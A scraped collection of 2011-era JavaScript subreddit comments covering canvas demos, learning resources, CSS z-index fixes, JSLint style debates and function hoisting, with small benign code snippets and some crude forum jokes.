Yes, I do?
I tried to draw a tree... http://i.imgur.com/2Yb2F.png I failed :(
they look like worms, good work tho
Hey that's really cool! On a related note, you wouldn't happen to know a good algorithm for smoothing a line as it is being drawn would you? 
Not sure if anyone still follows this thread, but I added Notifier.info = function(message, title, timeOut) { if (!timeOut) { timeOut = NotifierjsConfig.defaultTimeOut; } the **timeout** variable to all four functions to customize the delay when calling notify.
That's way fun.
[The github of this with explanation](https://github.com/fforw/jamrot)
There's nothing wrong with using `jQuery` and it actually makes their code less likely to collide with another library.
If you already feel comfortable working in js, I would read up on using the canvas. I would go through this [tutorial](https://developer.mozilla.org/en/Canvas_tutorial) as a starting point.
Very cool!
Made thanks to this tutorial http://t.co/2qxM92Ly and this kind of weird stuff http://en.wikipedia.org/wiki/Archimedean_spiral
Made thanks to this tutorial http://t.co/2qxM92Ly and this kind of weird stuff http://en.wikipedia.org/wiki/Archimedean_spiral
I fully realize that, and you've misrepresented the source of my criticism; as I've already said, it's not the tool itself, it's the idea that said tool is being welcomed as the panacea for all things web-development. While I concede that there are many cool tools enabled via Node, I also don't feel that Node has _put its time in_ to become a fully-matured project yet, and thus I'm apprehensive about getting into bed with it.
If you use a Node.js-based tool, you're not exactly going to bed with Node.js. Tools help you create software, they don't become part of it. You acted as if you were offended by the idea of using anything based on the new shiny, even if its code was going to be entirely orthogonal to yours. That's a bit much, if you ask me. Anyway, jQuery is a good solution for most website needs. If you want to make full-blown web applications, you'll probably need some things jQuery can't do for you and you may find jQuery's strengths unrelated to your actual problems, so it can be helpful to be able to make do with less because then you won't have to add an entire library just for one or two function calls. If all you need is a selector engine, jQuery is overkill.
You're misreading again, I was never offended. Agreed about your other points though.
&gt; lol, a Node.js suggestion. Color me surprised. Even if you weren't offended, that statement implies there is something wrong with using a Node.js-based tool by virtue of it being based on Node.js. That's no better than the bandwagoning you seem to detest.
_yawn_
My only suggestion would be to use [requestAnimationFrame instead of setInterval](http://paulirish.com/2011/requestanimationframe-for-smart-animating/).
There is no console object in IE6-8. By the way, you shouldn't look up the same elements over and over again. Do that once at the beginning.
Thank you very much! This has been bothering me for days. I appreciate the feedback. I am relatively new to JS.
It's basically a texture with a normal map, where a light of increasing intensity is added. Except instead of regular color the light has negative green and blue components, so it kind of "sucks" every color except the red. I thought it gave a nice bloody effect.
Nice work, dude!
Best to say which version you're having issues in for future reference. IE9 is waaaayyy different than IE8 and prior.
You are definitely correct, and it is IE9
Works pretty well on chrome, only issue is that sometimes clicking on other covers does not change the selected cover.
monkeydown?
Yea language design is a lot of fun, I love experimenting with creating little crazy languages. I'm actually working on a little ML-like language that compiles to JavaScript. I agree that you can often boost performance and expressiveness/ease at the same time, that's what I'd say we should shoot for with JS. Other times it's just a matter of balancing. IIRC we should be seeing something like what I want with StructTypes. One of the problems with JS objects re optimization is they are so dynamic. StructTypes are useful for the sorts of scenarios where I imagine "better classes" would be and JS engines can probably optimize them better. The "sugar classes" I'm not so crazy about. I don't think we "need" them, but they do provide a shortcut for a very common pattern and I think overall it's "meh". I think they probably just about balance with benefit vs cost of implementation.
some helpful resources: [31 days of canvas tutorials](http://creativejs.com/2011/08/31-days-of-canvas-tutorials/) [List of canvas wrappers](https://github.com/bebraw/jswiki/wiki/Canvas-wrappers) [List of HTML5 game engines](https://github.com/bebraw/jswiki/wiki/Game-Engines) 
i tried to draw boobies, but good god, they turned out way too *hairy!*
There is a console object in 8 but only when you have the developer tools open.
I think you're taking the right approach but the wrong reasons, wanting to roll your own autocomplete thing in pure javascript is great for learning javascript, not because you'll have complete control since you'll have as much control by using open source libraries and you won't lose time writing them you see that's important in software, reusability gets better quaility in less time. as for the question itself look for "keyboard events" those will let you react to the keys and act accordingly, they work as callbacks but be careful which element of the page you attach it to. also, in pure javascript you'll see that different browsers do things differently (yay for standards...) and that's one of the reasons a framework such as jQuery makes sense, it provides a unified API that is compatible with all of them.
I was JUST playing with MS' art of touch website, similar type thing https://www.artoftouch.com/en-us/
Is there a public demo anywhere?
It would be awesome if I could upload my own image and it did the affect on that..
Thanks! Just what my [penis pictures](http://i.imgur.com/Ve9z0.png) have been missing.
This is very cool. One suggestion: add an option to change the canvas color.
Really cool. Some suggestions: Move the sliders next to each other. The info box in the top left is ugly/annoying, I'd move it and style it so it's not just a truncated box of text. It'd also be cool if you added an option to pick the BG color, and allowed arbitrary colors instead of just a palette. 
This and the "This account is managed by..." when you're using apps on domain, oh and the constant manage links everywhere. UGH, come on Google. You're supposed to have good usability.
Open source? Once I add it to the skeleton site it technically will be. This editor is custom built for a PHP framework called Emergence where this editor does publishing through WebDAV. Of course you can use another WebDAV client to access this system. If you installed a website with the Emergence framework you could configure it to inherit all the source code from our Skeleton which is where this editor will reside. All sites built in the system that already use skeleton as a base will be able to simply receive the update and have access to this editor built in. If all you want to do is look at the javascript you can go to the URL in the screenshot to look at the JS. You won't be able to login though and see it in action.
Good call, will get to that ;)
Ahh, sorry man, nothing springs to mind :(
Interesting project but I can't understand why they choose to define a new proprietary element (&lt;scroll&gt;&lt;/scroll&gt;) instead of a custom data- attribute.
There's also Jison, a JS clone of Bison, which is the parser generator that CoffeeScript uses: https://github.com/zaach/jison
Yeah good idea! It would do a nice Facebook app, too bad I'm a bit late for halloween. The problem is that I need the [normal map of the image](http://en.wikipedia.org/wiki/Normal_mapping) to apply the effect, and that'd be a bit challenging to implement in JS...
Geocities never should've died! Bring back the dripping blood hr's!
ExtJs4 is a commercial product, but it appears to have an open source option: http://www.sencha.com/store/extjs/ http://www.sencha.com/products/extjs/license/ 
Please don't make it a Facebook App, I don't have facebook and I don't want to be excluded.
The keydown event does not bubble to the window object in MSIE. Attach the event handler to the document instead: // Keydown handler document.onkeydown = downSki;
http://stackoverflow.com/
http://stackoverflow.com/
http://stackoverflow.com/
http://stackoverflow.com/
More like.. ExtJs4 is an Open Source product with a commercial license. 
if you have a filter forwarding incoming mail they put you a warning for a week... and it reappears from time to time
btw anyone tried/using the gmail api for greasemonkey? - http://code.google.com/p/gmail-greasemonkey/wiki/GmailGreasemonkey10API
Web apps can't access the camera yet. There is work being done in the standards process to address this, but you won't see the fruits of this labor for many years. PhoneGap will take your web app and add extra, native APIs. In this case, navigator.camera has functions that will return a Data URI; an string that can be the src attribute of an img tag to display the picture. Because it is just a string, you can upload it to your server by posting it with Ajax. If you want camera support, this is the way to achieve it.
Script is badly written. Retries every second. Why not just adding a style rule with display:none !important?
I second these 3 recommendations. Along with perhaps a Javascript loader like JSL (http://www.andresvidal.com/jsl) or Require.js (http://requirejs.org/).
So this is like [Narcissus](http://en.wikipedia.org/wiki/Narcissus_%28JavaScript_engine%29)? Which you can also run in the browser, via [Zaphod](http://mozillalabs.com/zaphod).
I've been using Peg.js (http://pegjs.majda.cz/) with some success. I haven't benchmarked it but it's been quick to get new parsers up. 
I actually kind of like PHP - syntax is much like C which makes it easy for me. JavaScript isn't that different syntactically either, but of course it's a client side technology (not server side like PHP). I have an app in fact that uses client side JavaScript to make calls to a server that serves up data using PHP. Not sure if it's what I would have picked, but it was what was available, and it worked out just fine. Anyway my suggestion is to just start playing with it, and to remember that JavaScript has very little to do with Java other than similar syntax!
I'm not sure what your programming knowledge is, but [Code Academy](http://www.codecademy.com/) provides a nice way to get your feet wet with JavaScript basics.
https://developer.mozilla.org/en/JavaScript
The first thing I would do is gut anyone that ridicules you for using PHP. Then I'd pick up jQuery. I know a lot of people say learn JavaScript first then go on to a framework, for every other language I understand that but not for JavaScript. I was trying to learn JavaScript for months, finially took a look at jQuery. Fuck me. It just all clicked. It's also a lot easier to do things in jQuery then find out how to do them in real JavaScript.
we have too many of these "i want to learn javascript" posts but no sticky links on right nav of subreddit. Lets build a list to help them out.
Amazing
Check out Ed Finkler's Javascript for PHP Developers talk: [Audio is on this site](http://www.eschrade.com/page/zendcon-2010-podcasts/) and the slides are [here](http://www.slideshare.net/funkatron/javascript-for-php-developers-5647329)
lynda.com is a great source for programming. http://www.lynda.com/search?q=javascript&amp;x=0&amp;y=0
Kept crashing chrome on my mac pro / lion but now I'm getting a server error. Think their servers are slammed.
From my perspective, CoffeeScript is not a must learn. Especially if you're new to the scene, CS will just confuse matters.
You are NOT required to coffeescript. Coffeescript is a different *language* that compiles into JavaScript. If you wish to learn JavaScript, learn JavaScript. Here are some handy talks about the language by Douglas Crockford, one of the JS celebrities: * [Douglas Crockford: The JavaScript Programming Language](http://www.youtube.com/watch?v=v2ifWcnQs6M) * [Douglas Crockford: An Inconvenient API - The Theory of the DOM](http://www.youtube.com/watch?v=Y2Y0U-2qJMs) * [Douglas Crockford: Advanced JavaScript](http://www.youtube.com/watch?v=DwYPG6vreJg)
For me, one "aha" moment was realizing that Javascript is just a language, and that Javascript interacts with browsers through the DOM, and that those two are entirely separate from each other. JS is actually relatively easy to learn, but learning how to act on the DOM, and specifically the ins and outs of browser events takes a bit of head-to-desk action. In my experience - jQuery is a great way to interact with the DOM. It does pretty shit, you can traverse the dom super fluently, and it takes care of a lot of cross-browser issues. Depending on how deep you need to go I would start with that with the understanding that everything you can do in jQuery you can do with hand-rolled js.
Very neat!
this tells me that my graphics card is incompatible and links me to a website that tells me otherwise. 
Reminds me of a project I was working on a few years ago: http://gravytea.com/labs/metacoding/Editor/Demo.htm Never took of unfortunately (and yes, it could actually compile C/C#/...)
works here, firefox 8.0 on Snow Leopard/Macbook Pro
Spending very long time downloading that god damn mp3. Should have provided a .xm decoder in javascript.
Yep.
Selectors are queries against the DOM
Thanks a lot for pointing me in the right direction. I'll take a look at it.
CoffeeScript is great, but don't worry about it yet. It's a tool for JavaScript programmers, and you are not a JavaScript programmer yet (You have to already know JavaScript to use it effectively). Once you're pretty comfortable with JS, check out CoffeeScript and if it seems like your thing, learn it. In terms of resources: - Check out [Eloquent JavaScript](http://eloquentjavascript.net/), it's a free book available online. It's a good introduction to JavaScript if you have little programming experience. - [Professional JavaScript for Web Developers](http://www.amazon.com/Professional-JavaScript-Developers-Wrox-Programmer/dp/047022780X/ref=dp_ob_title_bk) is a book by Nicholas C Zakas, and is a great introduction to the language if you have some programming experience. - Some people will recommend you read "JavaScript: the Good Parts" by Douglas Crockford. This is a very good book, and I think you should read it...but it's not a great pick for first book IMHO; I'd read it second or so. - The above mentioned Douglas Crockford has a series of video lectures on JavaScript that are very good, do some Google-ing and check them out. You can watch them for free. - [Stay away from w3schools](http://w3fools.com/). It's not a very good source of information. The site I've linked you to provides a list of better sources. - Get on IRC and hang out in JavaScript and web-development channels. You will find very knowledgeable programmers there, and just by hanging out in the room and following everything you can absorb some of their knowledge. - [Stack Overflow](http://stackoverflow.com/) is pretty much the premiere place to go for help with programming problems. Remember to tag your question appropriately. - Seek out other groups/boards, like [JS Mentors](http://jsmentors.com/). Similar to IRC, you can pick up a lot of knowledge by reading.
Why is it that on my old work machine running XP and the latest Chrome I could never get WebGL to work but on my new work PC running Kubuntu and the latest Chrome it works (slowly) without any tinkering? The world has gone mad.
I have no idea what to do with this. Want to explain a bit why its cool and how you use (or would use) it? What benefits?
http://en.wikipedia.org/wiki/Code_coverage
http://www.reddit.com/r/redditrequest
Drivers, Chrome has a pretty strict whitelist.
Both were official Nvidia Quadro drivers, maybe I didn't update often enough. I just blamed XP for being old.
It's a CSS issue. The z-index of the horse div is lower than that of the icons. Try this line instead: &lt;div id="horse" style="z-index: 9; left:0; "&gt;&lt;img src="images/horse.jpg"&gt;&lt;/div&gt;
You know, you might want to try and reformulate your post as a specific question, instead of posting "I don't know why this isn't working please fix it." You might get more people willing to have a look at it. Are you getting any JavaScript errors? What are the relevant pieces of code? The more legwork you do, the more people will be willing to help you out.
This is a CSS problem, not a JavaScript problem. In styles.css on line 1, you need to give the horse a z-index. Doesn't have to be 999, just has to be greater than the z-index of the stuff you want behind it. Example: #horse { position: absolute; width: 100px; z-index: 999; } //edit: [why is this happening????](http://www.youtube.com/watch?v=txqiwrbYGrs)
I think we've found the next Angry Birds. :P
Do you not know how to use a database?
This, and don't say "click here," just spit out a link if there's nothing better to say.
DRAG EVERYTHING INTO MOUTH
It seems more like a css problem? Add top:200px; to #cardpile div Anycase here's what I've spotted, it probably won't help you with your problem, but some teaching points here: In XHTML, Tags without closing tags such as those of IMG and Meta in this page need to be "closed" with " /&gt;" like so: &lt;img src="horse.jpg" alt="" /&gt; #cardSlots div was declared twice in css. Redundancy can lead to bloated code and make it difficult to debug. You can move the background property from the second declaration into the first declaration and delete the second declaration. You've got a conditional comment for IE css, but it is empty, and the properties used are supported in most modern IE versions with a &lt;!doctype so it is not needed here. You've got numbers in an array, but not background url properties, leading to that whole overly complex for() solution you've got there. word was declared but not used. You could also store the value of correctCards in another variable like oldcorrectCards, then detect if correctCards is greater than oldcorrectCards, updating oldcorrectCards if it is, reducing the first 5 if statements into one.
That's incorrect, all that does is put the horse on top of the cards. The solution is to add top:200px; to #cardpile div I have some more helpful points in [another reply](http://www.reddit.com/r/javascript/comments/md9qo/why_is_this_happening/c300864).
That's incorrect, all that does is put the horse on top of the cards. The solution is to add top:200px; to #cardpile div I have some more helpful points in [another reply](http://www.reddit.com/r/javascript/comments/md9qo/why_is_this_happening/c300864).
It depends on your interpretation of "below". All the OP said was "I cant seem to move the icons below the picture of the moving horse." There's below (further down the page) on the Y-axis, and below (further back) on the Z-axis. When you load the page, what immediately seems obviously wrong is that the horse should be in front of the cards. This is how I interpreted the problem.
This may be a good place to start - stream.publish will post to an authenticated user's wall. This is in the context of a web app rather than from within phonegap though. var publish = { method: 'stream.publish', message: 'message here', picture : imageURL, link : linkURL, name: headline, caption: 'Photo caption', description: 'Photo description', actions : { name : 'Call to action!', link : linkURL} }; FB.api('/me/feed', 'post', publish, function(response) { if (!response || response.error) { //alert('Error occured'); } else { //alert('Post ID: ' + response.id); alert("Success!"); } });
Heh, well hopefully this also serves as a reminder to mmarzeotti of the importance of precise communication in IT. Technically, my solution is correct, depending on how one interprets the OP's definition of "below". Now that you've pointed out a better definition than the one I was using, I can of course see that it is better. I couldn't understand why OP would want to do what I showed him how to do, but I figured it's not my place to ask why!
Version 1.2.0 released.
As I see it, this is a tool to support the use of testing-driven development http://martinfowler.com/bliki/TestDrivenDevelopment.html So assume that your goal is to have thorough code overage, so that when you refactor your code or add new functionality you can run your tests and be sure that you haven't broken something. This is very important in large projects. While you can count your tests as a 'metric'... and you can be reasonably sure that you've covered the main paths through your application by inspecting them manually... as a developer you would much rather automate this process, especially on a larger project where you have tens of thousands of lines of code, hundreds of thousands of tests, etc. There are many testing frameworks for languages which are used in large commercial projects, with code coverage tools which can be applied to them (java:sonar, coberatura, emma, clover, jester, many more. ruby: rcov, metric_fu, many more), and you pick one depending on the tech stack of the project... This niche hasn't been filled for JavaScript yet and JesCov is an attempt to help out js developers who need this tool. Usage/adoption of js has grown enormously in recent years and more and more tools are springing up in the language ecosystem. In my opinion, code coverage is one of the most important metrics for a modern development team- is gives you the assurance that your test suites are covering what they need to cover and that you can refactor and add functionality without worrying about breaking your prior accomplishments in the codebase. More on the importance of code coverage: http://java.dzone.com/articles/is-code-coverage-important
I think you have to create another sound object and than pass it to the EvalSound().
I never have before and am wondering if there are any online resources, or recommended texts related to this topic. I have a month to make this work and a willingness to study learn and take advice, but simply don't know where to begin. Conceptually I know that both pages need to reference the same database, but I've never used databases before, so I don't know which technology (SQL?) to work with, or how ro integrate js with it.
I wrote something similar to require.js before I found it, but I made one mistake that he didn't, and he made one mistake that I didn't. The mistake I made, but require.js didn't: I loaded things into a global namespace to make them available... a la reddit.foo.bar instead of passing it as a response to the callback (though to be fair, I planned on adding it at some point). The mistake require.js made but I didn't: I gracefully handled errors when loading. require.js blows up catastrophically when you "require" a file that doesn't exist. Again, to be fair, his position is that this is by design, since you are *requiring* it. My opinion though, is that there's no good reason to do this... why not make it like an ajax request and let you catch the good success state by default, but at least *let* you catch the error state. (When I say it fails catastrophically, I mean it can no longer load anything after it fails to load a single file). The reason, as best I can tell that it does this, is because it manages the dependencies as a list, being careful about the order in which it adds them. This is a design flaw, in my own humble opinion, as it should be managed as a tree of callbacks, instead (sort of like a linked list). I.e. if A requires B, and B requires C and D, we should register a callback on C and D to call the loader for B, and when B loader gets all its callbacks, it will process itself and call back A. It's not terribly difficult to do it this way, and I have been silently hoping that the creator would change his mind about his implementation, but so far I don't think its happened. By the looks of it, I'll be rewriting mine to follow the AMD pattern, but have an optional "error" callback (and global error handling ability)... I'll be sure to post it to /r/javascript when I finish it :P (or honestly, if there's interest, I'll go ahead and put the latest code up on github and open source it now).
Maybe execute the whole thing in a [`setTimeout`](http://www.w3schools.com/jsref/met_win_settimeout.asp) with a time of 0 or 1 -- either within or outside of the function you have defined.
Clone the node and play that, &gt; "Cloning the node lets you play multiple instances of the same sound independently." &gt; &gt; http://robert.ocallahan.org/2011/11/latency-of-html5-sounds.html
wow. thank you. your something like a digital santa clause of information about programming. my baby memories of not getting programming books is totally being rewritten to include you. 
No problem, feel free to PM me if you ever need help with anything.
I thought this was going to be an article about the benefits of Intel's processors. Guess I should have noticed which subreddit it was in. Can these people not find a better acronym for their movement?
The author set up one at http://idflood.github.com/ThreeNodes.js/ . Have fun! :)
GIthub!!!!!
Congratulations. Very nice!
There's your answer. Quadro. Nvidia Quadro cards are made for OpenGL and pro 3d graphics work. On Windows, ANGLE (the wrapper that both FF and Chrome use to render) shunts WebGL to Direct3D. This is an attempt of addressing the issue that many windows machines have unusable OpenGL drivers. However it is often the case that people who did install up to date drivers have a far better experience with OpenGL then Direct3D (which is buggy as hell, more so than actually working OpenGL drivers). Quadros have miserable to non-existent Direct3D support. You can try --use-gl=desktop in chrome which forces ANGLE to use OpenGL instead of Direct3D You can try in about:config of Firefox to set webg.prefer-native true and webgl.force-enabled true which does the same thing. 
Ah I see. I have no idea why our dev machines have Quadros in them nor do I have any experience with Quadros whatsoever.
Awesome. Mind explaining a little bit about it?
It seems to me like there are nodes that move outwards somewhat randomly, and after each iteration a line is drawn between two nodes if they are close enough to each other. This line is lighter if the nodes are closer together and darker if they are further apart.
I ended up using a title and setting the text of the title as a variable link = [ "&lt;a href='#' title='" + blob + "' onclick='javascript:LaunchClinNoteViewer("
Great! Hey, any info on the algorithm you are using to draw the curves?
I'm not sure I'll be able to help you with your problem but I can help you qith your questioning, first do mention exactly what you're doing, "why my code doesn't work" is bad because nobody knows how;s it supposed to work and even worse is to say "it works but not as it should" also meniton the specifics, I know javascript but haven't worked much on chrome extensions, if it doesn't matter then say it too (it's tagged on SO, that solves the second issue but only there)
thanks for your advice. I have updated my SO post. I will do the same with my question here.
Nice that looks sweeeeeeet!
Congrats!!
Sure thing, it's a very simple concept: Arrange a number of points with initial parameters x, y, speed, direction and assign a random speed and direction to each. After each iteration of movement (a frame refresh, here), analyze the distances between each of the points. If 2 points are within a certain distance of each other, draw a line between them. There are some other salty things I do to make things a bit more interesting like having the points move in a noise field that affects their direction, reducing the opacity of the line as the points reach their max distance, and assigning a color to the line based on a colormap.
That's the idea
How do you add colors??
Feed it some image with that "load colormap" button.. I tried uploading various small image files until one of them made with the [pretty colors](http://i.imgur.com/Y1j5v.jpg).
Nice talk. Would have liked to hear what he has to say on closures and structures like the module pattern.
34:45 he says "dog balls"
Already done, check out jsmad. Make a FLAC decoder!
Good catch.
I need to start wearing white lab coats at work.
What did you use for the graphics? Canvas, SVG? Did you do it from scratch or utilize any toolkits? Looks very nice and smooth....I like it.
Really good talk, make me almost think JSlint is right.
It's canvas. Colormap sampling would still need a canvas element, but I guess the drawing could very well be in SVG. I have no idea how well that many vectors on stage at once would treat your processor/ram though. It's pretty intensive as it is. I use JQuery for the menu system (I may yet change this to dat.GUI) and to target elements on the page ( $("canvas") ), but everything else is straight JS. I find most libraries will eventually paint you into a corner or will break for unknown reasons when I try to do interesting things with them. So, I prefer to code as much as possible myself.
Protip: Colors are sampled at the starting position of each point. So, if you have start with a ring, you'll only get colors that are on the same ring of your color map. same with a line. Just something to keep in mind as you pick a color map.
I first learned about it from Yahoo (and I think they gave credit it to him), and he covers it in his book _JavaScript: The Good Parts_.
well, I can't think of a better name for them...
That makes sense. Will you be sharing a pull request on GitHub? It'll be nice to include this in the main branch.
Wadsworth link for the impatient: [youtube.com/watch?v=taaEzHI9xyY&amp;wadsworth=1](http://www.youtube.com/watch?v=taaEzHI9xyY&amp;wadsworth=1)
unfortunately I have no idea how to use git :s it's bad I know, but I never learned. Here's the modified file in pastebin though: http://pastebin.com/9PmS7Peq If you do a diff, you'll see the changes in the function calls on the bottom. Sorry I can't commit the changes automatically :( Thanks for making such a useful plugin. While taking about enhancements, I was looking at this plugin: http://boedesign.com/demos/gritter/ The notifications for glitter is always created in the space the user can see. However, in notifier, the message is created on top of the page regardless of where the user is. At times, the user does not see the notification at all. Is there a way to add this?
Essentially? Yes. Exactly? No. The first declaration creates an anonymous function that takes two parameters, and tells current scope variable `add` to point to that function. The second creates a new function in the current scope that will be called `add`. Do they end up as different results? Not really. So does it matter which one you use? Not really. More reading/slight differences, read the top answer here: http://stackoverflow.com/questions/1140089/how-does-an-anonymous-function-in-javascript-work
Note that you can also do: var add = function addNumbers(a, b) {...} ...creating a named function and assigning it to add. John Resig has some neat little examples of this [here](http://ejohn.org/apps/learn/#9). One difference between a named and anonymous function is that you can't get a value for arguments.callee.name from within an anonymous function. I've honestly never used this value, though.
()();
Wuuuuuhh?
 After playing around with the Devloper tools in chrome I have noticed that the localStorage is not appearing when I inspect the background.html. But when I inspect the options.html page I see the localStorage there. The way I understood localStorage is that it should share itself between the background.html and options.html and the content script is the reason I have to use message passing in order to get values that I have stored. Here is the code I am referring to. Could someone shed some light, or confirm/deny what i said.[ https://gist.github.com/1368689](https://gist.github.com/1368689) Thank you.
I'm making my own, also seeing about Vorbis/AIFF decoding too (Probably will land these before MP3). Maybe ALAC too.
I was considering adding that but I think the preamble is actually pretty interesting stuff too.
Read #3 if you only read one. Shame I can't send that back in time to myself.
There are subtle differences due to hoisting of named functions: This will work: foo(); function foo() { alert('foo') }; But this will fail: foo(); var foo = function() { alert('foo') }; 
Cool. I'll have to check it out then. I've not really found any explanation of closures and patterns that covered all the positives and negatives in a good way. I usually structure code like this: (function(){ var public, private; private = { //Private functions/variables }; public = { //Public functions/variables }; window.MyStuff = public; })(); so I was hoping he would have something to say on whether this is ok or bad. I see that I'm already guilty of "dog-balling" though so there might be other problems here as well. Personally though I kinda prefer the "dogballs" approach because it says to me that everything between the first parenthesis (or parens?) should be executed immediately. If you move the parenthesis it does not seem as clear in my opinion. After some further thought I'm not really sure I agree with his bashing of ++ and -- either. It seems like he only wants to ban those as HE cannot stop HIMSELF from doing something stupid with them, but I don't really think I've ever done anything more than the ++ on the same line so there I don't really see the problem. Now whether it is better to do += 1 or ++ simply for readability is another matter.
`arguments.callee.name` is used by debuggers (at least Chrome's, Safari's, and Firebug's). I prefer function statements to function assignment for this reason.
Congratulations. I remember this from a few units of time back.
the same the same, the same the same, the same (typeof) article as a 1000 before. yes, the same the same. one would assume that the people who vote this to the top are auditioning for a real life role in memento. 
Upboat for early morning sniggerage.
Take a look at knockout.js It's a javascript MVVM framework that plays nicely with other javascript things (particularly jquery). If you're a .net developer, you'll also be pleased to hear that razor has built in support for knockout (the guy who created knockout went on to work on mvc3 for MS).
First impression is good. Looks very suitable for small projects. What I'm missing is built-in support for custom UI widgets like sliders or modal popup windows. I guess I could leverage jQuery UI for that, but I'd still prefer to have it all in a single framework. And I'm not really sure whether to like the heavy use of HTML 5 data-attributes or not. Also, my apps need to be able to work in XHTML pages (not my idea!), and technically, data-attributes are not allowed there.
vapor.js - http://vaporjs.com/
I find that a bit too light-weight, actually…
I think you need a setTimeout() in there somewhere...
I tend to think the `++` and `--` (and the `switch`) hate are overplayed, as well, but if you really are working in a large team, you're almost certain to run into somebody who tries to get too clever with them, especially if you have former C (or C++) programmers of a certain age in the bunch. It's probably just easier to outlaw them than try to come up with a more nuanced approach (for social reasons in addition to technical ones). As for your approach, that's basically the module pattern, except less flexible: by making the assignment `window.MyStuff` explicitly inside the module (instead of assigning the module to a variable, e.g., `var MyStuff = …`), you're precluding the ability to have nested modules using exactly the same pattern. I also recently came across the "Revealing Module Pattern" which lets you use the (to my eyes) slightly more readable named function syntax instead of the object literal notation. Here's one [intro](http://www.klauskomenda.com/code/javascript-programming-patterns/#revealing) I found. 
The problem is, as he explains, is that most people don't understand the difference between `i++` and `++i`. Plus it gets confusing if you use it in any situation other than when its by itself in a statement e.g., var i = 0; var a = "asdf" + i++ + "asdf"; A novice might expect "asdf1asdf" but they'd be wrong, I've ~~seen~~ fixed code like this and it goes back to his quote &gt;"It hardly ever happens" means "It happens"
Maybe Google Charts?
The `switch` issue he describe in his example where he got burned by a fall through statement has happened to me as well, since then I've obeyed jsLint and have avoided getting burned by it again, it may result in a couple extra lines of code but you know what they say about an ounce of prevention.
I prefer the old `lint` for C's approach: only complain about fall-throughs, and allow them if you put in the special comment to suppress the check for that specific case. But if jsLint were that sophisticated, it probably wouldn't complain about every single `++` or `--`. As long as you only have one of those on a line/statement/expression (whichever is larger), you're probably not looking at an overly clever construct, and it makes loops much nicer. All in all, jsLint is a clear win, even if it has a couple of corner cases with which I disagree.
Yea the main one I disagree with is not allowing to shortcut the `hasOwnProperty` check in `for ... in` I want to use: for (key in obj) { if (!obj.hasOwnProperty(key)) { continue; } // ... } But jsLint doesn't like that, you have to do the positive and wrap executing code. I understand that `continue` and early `return`s disrupt code flow but the alternative looks very ugly. I've learned to ignore my gut's disapproval, it's really not that big of an inconvenience. 
Ugh. I don't really iterate properties in objects like that very often, but if I did that would piss me off. Oh well, at least most JS libs these days give you a helper function for that.
I'm sorry, but if you don't know the difference between `i++` and `++i`, then I don't want you committing code to my repo without extensive code review. I agree that you can abuse them, but they're very nice for the most basic use cases. I wish jsLint was a little more discerning. I understand why it isn't, though.
Don't learn Coffeescript, at least not yet. Books: Javascript: The Good Parts - By Crock Pro Javascript Techniques - By Resig Javascript Patterns - By Stef And I would read them in that order. 
I don't want to even try to learn from somebody that relies on automatic semicolon insertion.
I would start from scratch TBH. Assuming you don't need to support legacy browsers. (if you do, there are libraries to render canvas using VML)
We use Backbone.js + jQuery UI, and it works great. May not be for you if an all-in-one solution is required though.
you could use twitter bootstrap or jquery UI for things like popup windows, buttons, etc.
That was gorgeous on Chrome 17.0.938.0 dev on a run of the mill laptop running Win7 pro - 64bit. Damn gorgeous. Thank you!
Exactly. This is the significant difference. Important to note however is that the variable declaration (second example) is hoisted as well. It is the assignment that doesn't happen until runtime. See http://bonsaiden.github.com/JavaScript-Garden/#function.general
Sorry, I couldn't help myself. :)
Thank you for the suggestion, I took a look at Google Charts, but it seems to be more suitable for charts, not diagrams.
Yes, I don't know exactly what you want tö present, but Google Charts are nice because of their simple JS API.
Hmm.. I'm curious.. could you tell me why it would be better to start from scrath? I was thinking it would be easier to expand on something existing, especially since the time for the project is not very generous. Also, although I have quite a lot of experience with javascript in general, very little of it had to do with canvas, so I was thinking that looking at the way the library is built might help me a lot.
Pretty good write up overall - only big item I can think of that's been omitted is [dojo.stopEvent](http://dojotoolkit.org/reference-guide/dojo/stopEvent.html). Other useful links for anyone getting started with Dojo are the [API pages](http://dojotoolkit.org/api/), and [Dojocampus](http://dojocampus.org/) for demos and example code.
It really comes down to one thing: Do you pollute the global namespace (window) with various function names or do you organize your functions in your namespace (MyApp, API, ....)? function addNumbers(..) { .... } function PlayMusic(..) { .... } function getPage(..) { .... } App = {}; App.addNumbers = function(..) { .... }; App.PlayMusic = function(..) { .... }; App.getPage = function(..) { .... }; Demo = {}; Demo.addNumbers = function(..) { .... }; Demo.PlayMusic = function(..) { .... }; Demo.getPage = function(..) { .... };
CHROME only ;)
Twitter Bootstrap looks amazing. Thanks for the tip! Might not be the right thing for this project, but I definitely keep it in mind for future projects.
How is working with Backbone like? I'll probably not need models in the usual way because the apps I have to build are more like calculators for different things. Think about something like a mortgage calculator. You need a couple of inputs, some logic to validate them and calculate the results and draw a pretty graph. Can Backbone be of any help in a situation like this?
Your background.html should have a closing script tag after line 1. and a begin script tag before line 2. Can't have a src and still inline your JS. Looks like sample.js is use in the background so it's not a content script? if that's the case you don't need to use message passing.
Named function expressions demystified: http://kangax.github.com/nfe/ Explains the differences between function statements, unnamed function expressions, and named function expressions. In painful detail, that is. :)
please do! the web needs streamable, lossless audio!
Firstly you should decide if you want to use SVG or canvas to render. If you are going to be doing stuff like flowcharts, and want to capture a lot of mouse input then I would recommend SVG. SVG, however, is not supported on legacy browsers. If you find a library for drawing flowcharts/ diagrams, then you should definitely build on it, it is unlikely that such a library exists. Starting a project from scratch in JS honestly isn't to hard. You could use a jquery plugin like [this](http://keith-wood.name/svg.html) to make interacting with svg simpler. EDIT: If you have any problems while implementing, PM me and I would be happy to help.
| If you're a .net developer, you'll also be pleased to hear that razor has built in support for knockout Can you elaborate about this? I can't find anything about such built-in support in Razor. 
If you are wondering why, in the second construct the function is in expression position, in the first it is in statement position. In statement position the JavaScript engines hoist the name _and_the body of the function in expression position the name is hoisted, but the value (the function expression) is only applied at it's proper place in run-time. You might ask: why? Consider the following code: var operator; function add(a, b) { return a + b; } operator = add; console.log(operator(1, 3)); function subtract(a, b) { return a - b; } operator = subtract; console.log(operator(1, 3)); In this situation you want the flexibility to change the 'operator' at run-time. Thanks to the various ways you can declare functions and store them as values making a simple interpreter is almost trivial in JavaScript.
That is not the only way to refrain from polluting the global namespace. var x = "X, from the outside"; (function () {//an anonymous function, which provides closure var y = "Y, from the closure"; function foo() { var z = "Z, from inside foo"; console.log(x); console.log(y); console.log(z); } foo(); }()); In this example the function 'foo' is not in global scope whatsoever, and is executed with no globally named call. Foo can access global functions/data (or functions/data inside the closures that wrap it). The drawback is that foo cannot be called from outer closures directly. 
